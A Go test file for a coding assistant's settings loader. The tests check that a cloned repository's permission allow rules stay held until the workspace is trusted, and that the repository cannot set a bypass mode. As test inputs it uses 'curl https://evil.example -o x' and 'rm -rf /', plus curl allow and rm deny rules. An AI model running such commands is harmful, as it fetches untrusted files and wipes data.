package settings

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// A cloned repository's .claude/settings.json must not widen what is
// allowed before the folder is trusted: Claude Code applies a project's
// permissions.allow only once its workspace trust dialog is accepted, and
// its deny and ask rules right away, since they only restrict.
func TestLoadSettings_UntrustedProjectAllowHeld(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	cwd := t.TempDir()
	put(t, filepath.Join(cwd, ".claude", "settings.json"),
		`{"permissions":{"allow":["Bash(curl *)"],"deny":["Bash(rm *)"],"ask":["Bash(git push *)"]}}`)

	for _, headless := range []bool{false, true} {
		s := LoadSettings(cwd, LoadOptions{Headless: headless})
		if got := DecideIn(s.Permissions, cwd, "bash", "curl https://evil.example -o x", ModeManual); got != Ask {
			t.Errorf("headless=%v, untrusted: curl = %v, want ask (allow held)", headless, got)
		}
		if got := DecideIn(s.Permissions, cwd, "bash", "rm -rf /", ModeManual); got != Deny {
			t.Errorf("headless=%v, untrusted: rm = %v, want deny", headless, got)
		}
		if indexOf(s.Permissions.Ask, "Bash(git push *)") < 0 {
			t.Errorf("headless=%v, untrusted: ask rule not applied: %q", headless, s.Permissions.Ask)
		}
		if indexOf(s.HeldAllow, "Bash(curl *)") < 0 || len(s.HeldFrom) != len(s.HeldAllow) ||
			s.HeldFrom[0].File != filepath.Join(cwd, ".claude", "settings.json") {
			t.Errorf("headless=%v: HeldAllow=%q HeldFrom=%+v", headless, s.HeldAllow, s.HeldFrom)
		}
	}

	s := LoadSettings(cwd, LoadOptions{Trusted: true})
	if got := DecideIn(s.Permissions, cwd, "bash", "curl https://evil.example -o x", ModeManual); got != Allow {
		t.Errorf("trusted: curl = %v, want allow", got)
	}
	if len(s.HeldAllow) != 0 || len(s.HeldFiles) != 0 {
		t.Errorf("trusted: held %q from %q", s.HeldAllow, s.HeldFiles)
	}
}

// The person's own settings are never held: user settings and the
// --settings file they typed apply in an untrusted folder too.
func TestLoadSettings_UntrustedKeepsUserAndFlagAllow(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cwd := t.TempDir()
	put(t, filepath.Join(home, ".claude", "settings.json"), `{"permissions":{"allow":["Bash(make *)"]}}`)
	extra := filepath.Join(t.TempDir(), "flags.json")
	put(t, extra, `{"permissions":{"allow":["Bash(go test *)"]}}`)
	s := LoadSettings(cwd, LoadOptions{Extra: extra})
	if indexOf(s.Permissions.Allow, "Bash(make *)") < 0 || indexOf(s.Permissions.Allow, "Bash(go test *)") < 0 {
		t.Errorf("allow = %q, want the user's and --settings rules", s.Permissions.Allow)
	}
	if len(s.HeldAllow) != 0 {
		t.Errorf("held %q", s.HeldAllow)
	}
}

// .claude/settings.local.json is normally the person's own file. Before an
// interactive trust dialog Claude Code runs no git in the folder and holds
// it like the project's; under -p it asks git, and holds it only when the
// repository supplied it (tracked, or .claude a symlink).
func TestLoadSettings_UntrustedLocalFile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	t.Setenv("HOME", t.TempDir())
	body := `{"permissions":{"allow":["Bash(curl *)"],"deny":["Bash(rm *)"]}}`

	untracked := t.TempDir()
	put(t, filepath.Join(untracked, ".claude", "settings.local.json"), body)

	tracked := t.TempDir()
	put(t, filepath.Join(tracked, ".claude", "settings.local.json"), body)
	for _, args := range [][]string{{"init", "-q"}, {"add", "-f", ".claude/settings.local.json"}} {
		if out, err := exec.Command("git", append([]string{"-C", tracked}, args...)...).CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}

	linked := t.TempDir()
	shipped := t.TempDir()
	put(t, filepath.Join(shipped, "settings.local.json"), body)
	if err := os.Symlink(shipped, filepath.Join(linked, ".claude")); err != nil {
		t.Skipf("no symlinks here: %v", err)
	}

	for _, c := range []struct {
		name     string
		cwd      string
		headless bool
		held     bool
	}{
		{"untracked, interactive", untracked, false, true},
		{"untracked, -p", untracked, true, false},
		{"tracked, -p", tracked, true, true},
		{"symlinked .claude, -p", linked, true, true},
	} {
		s := LoadSettings(c.cwd, LoadOptions{Headless: c.headless})
		if held := indexOf(s.Permissions.Allow, "Bash(curl *)") < 0; held != c.held {
			t.Errorf("%s: allow held = %v, want %v", c.name, held, c.held)
		}
		if indexOf(s.Permissions.Deny, "Bash(rm *)") < 0 {
			t.Errorf("%s: deny not applied", c.name)
		}
		if s := LoadSettings(c.cwd, LoadOptions{Trusted: true, Headless: c.headless}); indexOf(s.Permissions.Allow, "Bash(curl *)") < 0 {
			t.Errorf("%s, trusted: allow not applied", c.name)
		}
	}
}

// permissions.defaultMode auto and bypassPermissions never take effect
// from a project or local file, trusted or not, as in Claude Code: the
// session starts in the built-in default, not the user's mode. Other
// modes apply from any file; user settings and --settings may set any.
func TestLoadSettings_RepoDefaultModeLimits(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	put(t, filepath.Join(home, ".claude", "settings.json"), `{"permissions":{"defaultMode":"acceptEdits"}}`)

	for _, c := range []struct {
		name, file, mode string
		want             PermissionMode
		ignored          bool
	}{
		{"project bypass", ".claude/settings.json", "bypassPermissions", "", true},
		{"local auto", ".claude/settings.local.json", "auto", "", true},
		{"project plan", ".claude/settings.json", "plan", ModePlan, false},
	} {
		cwd := t.TempDir()
		put(t, filepath.Join(cwd, c.file), `{"permissions":{"defaultMode":"`+c.mode+`"}}`)
		for _, trusted := range []bool{false, true} {
			s := LoadSettings(cwd, LoadOptions{Trusted: trusted})
			if s.Permissions.DefaultMode != c.want {
				t.Errorf("%s, trusted=%v: mode = %q, want %q", c.name, trusted, s.Permissions.DefaultMode, c.want)
			}
			if (len(s.IgnoredModes) > 0) != c.ignored {
				t.Errorf("%s, trusted=%v: IgnoredModes = %q", c.name, trusted, s.IgnoredModes)
			}
		}
	}

	put(t, filepath.Join(home, ".claude", "settings.json"), `{"permissions":{"defaultMode":"bypassPermissions"}}`)
	extra := filepath.Join(t.TempDir(), "flags.json")
	put(t, extra, `{"permissions":{"defaultMode":"auto"}}`)
	cwd := t.TempDir()
	if s := LoadSettings(cwd, LoadOptions{}); s.Permissions.DefaultMode != ModeBypassPermissions {
		t.Errorf("user bypass: mode = %q", s.Permissions.DefaultMode)
	}
	if s := LoadSettings(cwd, LoadOptions{Extra: extra}); s.Permissions.DefaultMode != ModeAuto || len(s.IgnoredModes) != 0 {
		t.Errorf("--settings auto: mode = %q, ignored %q", s.Permissions.DefaultMode, s.IgnoredModes)
	}
}
